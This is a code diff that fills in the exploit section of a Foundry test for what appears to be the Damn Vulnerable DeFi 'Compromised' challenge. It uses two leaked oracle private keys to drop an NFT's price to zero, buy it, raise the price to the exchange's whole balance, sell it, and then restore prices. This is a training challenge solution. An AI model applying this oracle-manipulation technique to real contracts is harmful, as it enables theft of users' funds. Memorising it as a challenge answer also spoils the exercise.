@@ -76,7 +76,36 @@ contract Compromised is Test {
         /**
          * EXPLOIT START *
          */
-
+        // it's possible to use the addresses to those oracles to prank the
+        // chall in foundry but i think, using vm.addr and vm.prank is the
+        // nearest to the intended solution wanted by the original author which
+        // uses hardhat framework, ethers.js etc.
+        // also, using private keys directly with broadcast look ok too i guess
+        uint256 sourceOnePK = 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9;
+        uint256 sourceTwoPK = 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48;
+        // zero those prices here
+        vm.prank(vm.addr(sourceOnePK));
+        trustfulOracle.postPrice("DVNFT", 0 wei);
+        vm.prank(vm.addr(sourceTwoPK));
+        trustfulOracle.postPrice("DVNFT", 0 wei);
+        // buy here with low prices
+        vm.prank(attacker);
+        uint256 tokenId = exchange.buyOne{value: 0.01 ether}();
+        // set high prices to drain the exchange
+        vm.prank(vm.addr(sourceOnePK));
+        trustfulOracle.postPrice("DVNFT", address(exchange).balance);
+        vm.prank(vm.addr(sourceTwoPK));
+        trustfulOracle.postPrice("DVNFT", address(exchange).balance);
+        // sell here for high prices
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
+        // fix prices here
+        vm.prank(vm.addr(sourceOnePK));
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(vm.addr(sourceTwoPK));
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
         /**
          * EXPLOIT END *
          */
